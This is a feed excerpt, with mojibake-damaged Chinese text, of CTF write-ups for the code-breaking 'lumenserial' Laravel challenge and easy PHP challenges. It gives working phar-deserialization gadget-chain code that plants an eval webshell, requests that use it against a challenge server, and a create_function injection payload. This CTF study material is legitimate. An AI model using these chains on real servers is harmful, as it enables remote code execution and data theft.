    <title>code-breaking lumenserial å¤ç°</title>
    <link href="https://hurricane618.me/2019/01/24/code-breaking-lumenserial/"/>
    <id>https://hurricane618.me/2019/01/24/code-breaking-lumenserial/</id>
    <published>2019-01-24T00:54:06.000Z</published>
    <updated>2019-01-24T01:29:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>phpçš„laravelæ¡†æ¶çš„å®¡è®¡é¢˜ç›®ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å¤ç°è¿‡ç¨‹ã€‚æ•´ä½“æ€è·¯æ˜¯venenof7å¸ˆå‚…çš„ã€‚</p><p>å…ˆæ¥çœ‹å…¥å£ï¼Œä¸çŸ¥é“ä»–ä»¬æ€ä¹ˆå°±æ‰¾åˆ°äº†è¿™ä¸ªè¯·æ±‚â€¦â€¦</p><p><code>/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/</code></p><p>æˆ‘åœ¨é»‘ç›’æµ‹è¯•çš„æ—¶å€™åªæ‰¾åˆ°äº†actionï¼Œå®Œå…¨æ²¡æœ‰sourceçš„å½±å­ï¼Œä¸ªäººæ„Ÿè§‰æ˜¯ç»“åˆç™½ç›’æµ‹è¯•å‡ºæ¥çš„ã€‚è¿™é‡Œå¯¹åº”çš„æºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span>&#123;</span><br><span class="line">$sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">$rets = [];</span><br><span class="line"><span class="keyword">if</span> ($sources) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">$rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> response()-&gt;json([</span><br><span class="line"><span class="string">'state'</span> =&gt; <span class="string">'SUCCESS'</span>,</span><br><span class="line"><span class="string">'list'</span> =&gt; $rets</span><br><span class="line">]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$maxSize = <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherMaxSize'</span>];</span><br><span class="line">        $limitExtension = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ltrim($ext, <span class="string">'.'</span>);</span><br><span class="line">        &#125;, <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherAllowFiles'</span>]);</span><br><span class="line">        $allowTypes = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"image/&#123;$ext&#125;"</span>;</span><br><span class="line">        &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents($url);  urlä¸ºå›¾ç‰‡è·¯å¾„</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line">çœç•¥ä¸‹é¢çš„ä¸é‡è¦ä»£ç â€¦â€¦</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†<code>file_get_contents</code>è¿›è¡Œæ–‡ä»¶æ“ä½œï¼ŒåŒæ ·æ˜¯ä½¿ç”¨blackhatè®®é¢˜ä¸Šçš„pharåœ¨æ–‡ä»¶æ“ä½œæ—¶ä¼šæ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚è¿™é‡Œåªéœ€è¦å¯»æ‰¾æœ‰<code>__destruct</code>å’Œ<code>__wakeup</code>çš„ç±»ã€‚</p><p>è¿™é‡Œå…¨å±€æœç´¢<code>__destruct</code>ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<code>class PendingBroadcast</code>ï¼Œå…¶ä»–çš„éƒ½ä¸å¤ªèƒ½ä½¿ç”¨ï¼Œè¦ä¸æ˜¯destructé‡Œé¢æ²¡ä¸œè¥¿ï¼Œå°±æ˜¯destructé‡Œé¢æ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡ä¸å¯æ§ã€‚è€Œè¿™ä¸ªå”¯ä¸€ä¸€ä¸ªæ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡å¯æ§çš„ï¼Œå¯ä»¥å°†æ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡æ¢æˆæ²¡æœ‰è¯¥æ–¹æ³•çš„å¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœç´¢<code>__call</code>å¾—åˆ°<code>Generator</code>è¿™ä¸ªç±»ä¸­æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”å…¶ä¸­çš„<code>__call</code>èƒ½è°ƒç”¨<code>format</code>è€Œè¿™ä¸ªåˆä¼šè°ƒç”¨<code>call_user_func_array</code>ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰§è¡Œä»£ç äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line"><span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸€å¼€å§‹æ„é€ çš„æ˜¯åªèƒ½æ‰§è¡Œå•ä¸ªå‡½æ•°ï¼Œé€šè¿‡åœ¨formattersä¸­çš„æ•°ç»„å­˜å‚¨å‡½æ•°åï¼Œæœ€åè¢«è°ƒç”¨ï¼Œåªæ˜¯ç°åœ¨è¿˜æ²¡åŠæ³•ä»£å…¥å‚æ•°ã€‚æ¥çœ‹çœ‹venenof7å¸ˆå‚…çš„payloadã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">obj_1</span> = <span class="title">array</span>("<span class="title">dispatch</span>"=&gt;"<span class="title">phpinfo</span>");</span><br><span class="line">$obj_2 = <span class="keyword">new</span> Faker\Generator($obj_1);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_2, <span class="number">1</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ å…¥æ•°ç»„æ˜¯å› ä¸º<code>getFormatter</code>å‡½æ•°ä¼šå–formattersæ•°ç»„ä¸­çš„å¯¹åº”æ–¹æ³•åçš„å€¼ã€‚</p><p>è¿™é‡Œç”Ÿæˆ1.giféœ€è¦å…ˆæŠŠpharçš„åªè¯»æ”¹æˆå¯ä»¥å†™æ‰è¡Œã€‚å…·ä½“æ“ä½œæŠŠé€‰é¡¹æ”¹æˆoffï¼Œå¹¶ä¸”å»é™¤æ³¨é‡Š<code>phar.readonly = Off</code></p><p>ç„¶è€Œï¼Œé‡å‘½åæ— æ³•æˆåŠŸæ‰§è¡Œâ€¦â€¦æ­»æ´»ä¸è¡Œã€‚ã€‚ã€‚æ‰‹åŠ¨ä¿®æ”¹ingï¼Œä¸Šä¼ æœåŠ¡å™¨ï¼ŒæŠ“åŒ…æ‹¿åˆ°å›¾ç‰‡è·¯å¾„ã€‚</p><p>è®¿é—®<code>http://51.158.73.123:8080/server/editor?action=catchimage&amp;source[]=phar:///var/www/html/upload/image/65628379e91fb1adb860f98cd9f49712/201901/23/bed4111d42fb35cfdcff.gif</code> æˆåŠŸæ‰§è¡Œ</p><img src="/2019/01/24/code-breaking-lumenserial/1.png"><p>æˆ‘ä»¬çŸ¥é“äº†æœåŠ¡å™¨çš„phpç‰ˆæœ¬æ˜¯å¾ˆæ–°çš„7.2.12ï¼Œè¿˜æœ‰ä¸€äº›ç›¸å…³çš„phpä¿¡æ¯ã€‚</p><p>ä¸ºäº†è§£å†³å‚æ•°é—®é¢˜ï¼Œå¿…é¡»è¦å¼•å…¥å…¶ä»–çš„ç±»ï¼Œä¹‹å‰çš„<code>$this-&gt;event</code>åªèƒ½å¼•ç”¨ä¸€ä¸ªå‚æ•°ã€‚</p><p>è¿˜æ˜¯venenof7å¸ˆå‚…çš„æ–¹æ³•ï¼Œå¦‚æœæœ¬èº«å‚æ•°ä¸èƒ½ä¸ºæ•°ç»„çš„è¯ï¼Œé‚£å°±æ‰¾å…¶ä»–å®ä¾‹çš„æ–¹æ³•ï¼Œç„¶ååœ¨å…¶ä»–å®ä¾‹çš„æ–¹æ³•ä¸­å†æ¬¡æ„é€ å¯ä»¥æ§åˆ¶çš„æ‰§è¡Œå‡½æ•°å¹¶ä¸”å‚æ•°ä¹Ÿèƒ½æ§åˆ¶ã€‚</p><p>è¿™é‡Œæ‰¾åˆ°çš„æ˜¯<code>ReturnCallback</code>å’Œ<code>StaticInvocation</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReturnCallback</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function invoke(Invocation $invocation)&#123;</span><br><span class="line"><span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticInvocation</span> <span class="keyword">implements</span> <span class="title">Invocation</span>, <span class="title">SelfDescribing</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function getParameters(): array&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±æœ‰å¯æ§çš„å‡½æ•°å’Œå¯æ§çš„å‚æ•°ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹å†èµ°ä¸€éï¼Œå»ºè®®å¤§å®¶å¯ä»¥æŠŠæ•´ä¸ªè¿‡ç¨‹ç”¨çº¸ç”»ä¸€ä¸‹ï¼Œå…¨ç”¨è„‘å­æœ‰ç‚¹éš¾ã€‚é¦–å…ˆï¼Œ<code>$this-&gt;events</code>èµ‹å€¼æˆ<code>Generator</code>å®ä¾‹è¿™æ ·å°±ä¼šè°ƒç”¨<code>__call</code>æ‰§è¡Œç¬¬ä¸€ä¸ª<code>call_user_func_array</code>ã€‚å…¶æ¬¡ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œä¸­è°ƒç”¨<code>invoke</code>æ–¹æ³•ï¼Œé‡Œé¢çš„callbackè®¾ç½®æˆ<code>file_put_contents</code>ï¼Œä¹‹åinvokeçš„å‚æ•°ä¸º<code>StaticInvocation</code>çš„å®ä¾‹ï¼Œå®ä¾‹ä¸­çš„æœ‰æ•°ç»„çš„å‚æ•°å½“åšinvokeè°ƒç”¨çš„ç¬¬äºŒä¸ªå‡½æ•°æ‰§è¡Œä¸­çš„å‚æ•°ã€‚æœ€åå°±å˜æˆäº†ä»»æ„ä»£ç æ‰§è¡Œã€‚ç»™ä¸€ä¸‹payloadã€‚</p><h2 id="é¢˜ç›®payload"><a href="#é¢˜ç›®payload" class="headerlink" title="é¢˜ç›®payload"></a>é¢˜ç›®payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$obj_para = array('/var/www/html/upload/image/618.php', '&lt;?php @eval($_GET[618]);?&gt;');</span><br><span class="line">$obj_1 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($obj_para);</span><br><span class="line">$obj_2 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback(<span class="string">'file_put_contents'</span>);</span><br><span class="line">$obj_3 = <span class="keyword">array</span>(<span class="string">'dispatch'</span>=&gt;<span class="keyword">array</span>($obj_2, <span class="string">'invoke'</span>));</span><br><span class="line">$obj_4 = <span class="keyword">new</span> Faker\Generator($obj_3);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_4, $obj_1);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'2.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'2.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'2.phar'</span>, <span class="string">'2.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¸Šä¼ ä¹‹åæ‰§è¡Œä¸€ä¸‹ä¸Šé¢ç±»ä¼¼çš„è¯­å¥å°±è§¦å‘æ‰§è¡Œç”Ÿæˆwebshellï¼Œç„¶åå°±æ‹¿flagã€‚</p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(glob(%27/var/www/*%27));</code></p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(file_get_contents(%27/var/www/flag_larave1_b0ne%27));</code></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf" target="_blank" rel="noopener">http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;/a&gt;é¢˜ç›®åˆ†æ&lt;/h2&gt;&lt;p&gt;phpçš„laravelæ¡†æ¶çš„å®¡è®¡é¢˜ç›®ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å¤ç°è¿‡ç¨‹ã€‚æ•´ä½“æ€è·¯æ˜¯venenof7å¸ˆå‚…çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ¥çœ‹å…¥å£ï¼Œä¸
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking easyéƒ¨åˆ†é¢˜ç›®writeup</title>
    <link href="https://hurricane618.me/2019/01/10/code-breaking-esay-wp/"/>
    <id>https://hurricane618.me/2019/01/10/code-breaking-esay-wp/</id>
    <published>2019-01-10T06:02:10.000Z</published>
    <updated>2019-01-10T06:45:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>phå¸ˆå‚…çš„ä»£ç å®¡è®¡CTFé¢˜ç›® <code>https://code-breaking.com</code></p><h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$actionÂ =Â $_GET[<span class="string">'action'</span>]Â ??Â <span class="string">''</span>;$argÂ =Â $_GET[<span class="string">'arg'</span>]Â ??Â <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,Â $action))Â &#123;</span><br><span class="line">Â Â Â Â show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â $action(<span class="string">''</span>,Â $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å‘ç°æ­£å¸¸çš„å‡½æ•°åéƒ½ä¸è¡Œï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“è”æƒ³åˆ°è¦åœ¨å‡½æ•°åä¸­åŠ å…¥å…¶å®ƒå­—ç¬¦ï¼Œè¿™é“é¢˜æ²¡æƒ³åˆ°å¯ä»¥ç”¨<code>create_function</code>ï¼Œä¸€å¼€å§‹ä¸€ç›´åœ¨æƒ³å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ç¬¦åˆè¦æ±‚çš„â€¦â€¦</p><p>æƒ³åˆ°<code>create_function</code>ä¹‹åï¼Œè¦æµ‹è¯•å“ªä¸ªå­—ç¬¦å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œæœ‰å¸ˆå‚…ç”¨äº†burpæµ‹è¯•å‡½æ•°æ˜¯<code>var_dump</code>æ¥fuzzï¼Œæœ€åfuzzå‡ºäº†<code>%5c</code>ï¼Œå°±æ˜¯<code>\</code>ã€‚åœ¨å°å¯†åœˆä¸­å¸ˆå‚…çš„è§£é‡Šæ˜¯PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code> ï¼Œå¦‚æœç›´æ¥å†™<code>function_name()</code>è°ƒç”¨ç›¸å½“äºæ˜¯ç”¨ç›¸å¯¹è·¯å¾„åœ¨è°ƒç”¨å‡½æ•°ï¼Œå¦‚æœå†™æˆ<code>\function_name()</code>ç›¸å½“äºç”¨ç»å¯¹è·¯å¾„è°ƒç”¨å‡½æ•°ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p><p>å¦‚ä½•åœ¨create_functionä¸­æ‰§è¡Œä»£ç å‘¢ï¼Ÿ<code>http://blog.51cto.com/lovexm/1743442</code></p><p>è¿™ç¯‡æ–‡ç« ä¸­ä»‹ç»äº†åœ¨create_functionä¸­å¦‚ä½•æ³¨å…¥ä»£ç å¹¶ä¸”æ‰§è¡Œã€‚ç®€å•æ¥è¯´æ˜¯é€šè¿‡è¾“å…¥<code>}</code>æ¥é—­åˆå‡½æ•°ï¼Œä¹‹åå†æ³¨å…¥æˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$a'</span>, <span class="string">"return 666;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;<span class="comment">//lambda_xxx</span></span><br><span class="line">$b(<span class="number">1</span>)<span class="comment">//return 666</span></span><br><span class="line"></span><br><span class="line">è¿™ä¸ªåŒ¿åå‡½æ•°ç­‰æ•ˆäº</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å¦‚æœæ³¨å…¥&#125;</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;&#125;<span class="keyword">eval</span>(<span class="string">"phpinfo()"</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">è¿™æ 